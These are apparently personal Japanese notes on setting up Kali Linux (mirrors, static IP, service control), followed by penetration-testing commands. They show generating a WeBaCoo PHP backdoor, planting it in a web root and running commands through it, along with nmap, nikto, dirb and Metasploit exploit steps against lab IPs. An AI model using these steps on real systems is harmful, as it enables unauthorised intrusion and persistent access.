# インストール

## メモ

- プロキシ環境に持っていってインストールをしない！！ (理由: 自宅に帰ってからパッケージを入れようとしてもみつけられなくなった...)

<br><br><br>

# インストール後にミラーを追加する

https://forums.kali.org/showthread.php?72-Adding-Mirrors-After-Install

### Adding Mirrors After Install

 
If you didn't have an active or reliable internet connection during a hard disk install, you probably didn't get the mirrors added at that time. This will cause issues in the future when seeking new or updated software packages from the Kali repos. 

To add the sources:

1. Use your favored text editor to open /etc/apt/sources.list

2. Add the following two lines to your source list:
deb http://http.kali.org/kali kali main non-free contrib
deb-src http://http.kali.org/kali kali main non-free contrib

3. Save and you're good to go!

You can check that the sources have been added and are being used by loading Add/Remove Software from the Sys Tools menu and selecting System -> Software Sources.


# 静的 IP アドレス

```
root@localhost:~# cat /etc/network/interfaces
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback


auto eth0
iface eth0 inet static
address 192.168.141.153
netmask 255.255.255.0
gateway 192.168.141.2
dns-nameservers 192.168.141.2


root@localhost:~#

```

<br>
<br>
<br>

# controling services

## updating system.

```
# apt-get update
# apt-get upgrade
```

## show services.

```
# systemctl -t service
# systemctl -t service --all
```

## show status of service.

```
# systemctl is-enabled ssh
# systemctl is-enabled apache2
```

## show status of services.

- CentOS とかの chkconfig に相当

```
# sysv-rc-conf --list
```

## enabling or disabling services.

```
# sysv-rc-conf
```

```
l SysV Runlevel Config   -: stop service  =/+: start service  h: help  q: quit qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqk
x                                                                                                                         x
x service      1       2       3       4       5       0       6       S                                                  x
x ----------------------------------------------------------------------------                                            x
x anacron     [ ]     [X]     [X]     [X]     [X]     [ ]     [ ]     [ ]                                                 x
x apache2     [ ]     [ ]     [ ]     [ ]     [ ]     [ ]     [ ]     [ ]                                                 x
x arpwatch    [ ]     [X]     [X]     [X]     [X]     [ ]     [ ]     [ ]                                                 x
x atftpd      [ ]     [ ]     [ ]     [ ]     [ ]     [ ]     [ ]     [ ]                                                 x
x avahi-dae$  [ ]     [ ]     [ ]     [ ]     [ ]     [ ]     [ ]     [ ]                                                 x
x beef-xss    [ ]     [ ]     [ ]     [ ]     [ ]     [ ]     [ ]     [ ]                                                 x
x binfmt-su$  [ ]     [X]     [X]     [X]     [X]     [ ]     [ ]     [ ]                                                 x
x bluetooth   [ ]     [ ]     [ ]     [ ]     [ ]     [ ]     [ ]     [ ]                                                 x
x bootlogs    [X]     [X]     [X]     [X]     [X]     [ ]     [ ]     [ ]                                                 x
x                                                                                                                         x
mqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqj
lqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqk
x Use the arrow keys or mouse to move around.      ^n: next pg     ^p: prev pg                                            x
x                        space: toggle service on / off                                                                   x
mqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqj
```

## enabling service.

```
# systemctl enable ssh
# systemctl enable apache2
```

## starting/stoping service

```
# systemctl start ssh
# systemctl start apache2
```

<br>
<br>
<br>

# Kali Linux をインストールしたら

## ssh を使えるようにする

デフォルトでは ssh が起動していないため、```service ssh start``` する。なお、自動起動にするために ```systemctl enable ssh``` も。

<br>
<br>
<br>

# Webacoo

　ハッキングツール？ 攻撃者の手を知ることは重要。

## backdoor を作成する

```
$ webacoo -g -o backdoor.php

        WeBaCoo 0.2.3 - Web Backdoor Cookie Script-Kit
        Copyright (C) 2011-2012 Anestis Bechtsoudis
        { @anestisb | anestis@bechtsoudis.com | http(s)://bechtsoudis.com }

[+] Backdoor file "backdoor.php" created.

$ ls
backdoor.php
```

## backdoor.php を仕掛ける

　対象のサーバーに backdoor.php を配置する。たとえば ```/var/www/html/backdoor.php``` のように配置。

## Cracking

　backdoor.php にアクセス。apache ユーザーでコマンドを実行できるようになる。
　
```
$ webacoo -t -u http://192.168.yyy.zzz/backdoor.php

        WeBaCoo 0.2.3 - Web Backdoor Cookie Script-Kit
        Copyright (C) 2011-2012 Anestis Bechtsoudis
        { @anestisb | anestis@bechtsoudis.com | http(s)://bechtsoudis.com }

[+] Connecting to remote server as...
uid=48(apache) gid=48(apache) groups=48(apache) context=unconfined_u:system_r:httpd_t:s0

[*] Type 'load' to use an extension module.
[*] Type ':<cmd>' to run local OS commands.
[*] Type 'exit' to quit terminal.

webacoo$ id
uid=48(apache) gid=48(apache) groups=48(apache) context=unconfined_u:system_r:httpd_t:s0
webacoo$ pwd
/var/www/html
webacoo$ ls -lF
total 8
-rw-r--r--. 1 root root 576 Aug 23 00:14 backdoor.php
-rw-r--r--. 1 root root   2 Aug 23 00:18 index.html
webacoo$
```

# OS をスキャンする

```bash
nmap -O 192.168.56.101
```

* サービスの列挙, OS を特定, ポート 1-656535

```bash
nmap -sV -O -p- 172.20.10.5
```

# nmap

```
sudo nmap -sS -A 10.0.2.15
```

# skipfish

* Google のクローリングツール

```
skipfish -o log 10.0.2.15
```

# dirb

* 同じくクローリングツール

```
dirb http://10.0.2.15/
```

# nikto

* ウェブアプリケーション診断

```
nikto -h 10.0.2.15
```
# Metasploit

```
msfconsole
```

* exploit を検索する

```
search apache bash
```

* オプションを確認する

```
options
```

* オプションを変更する

```
set TARGETURI /cgi-bin/index.cgi
```

* exploit を実行する

```
exploit
```

※もしくは `run`

# davtest - WevDAV へのアクセスを確認する

```sh
davtest -url http://192.168.141.147
```
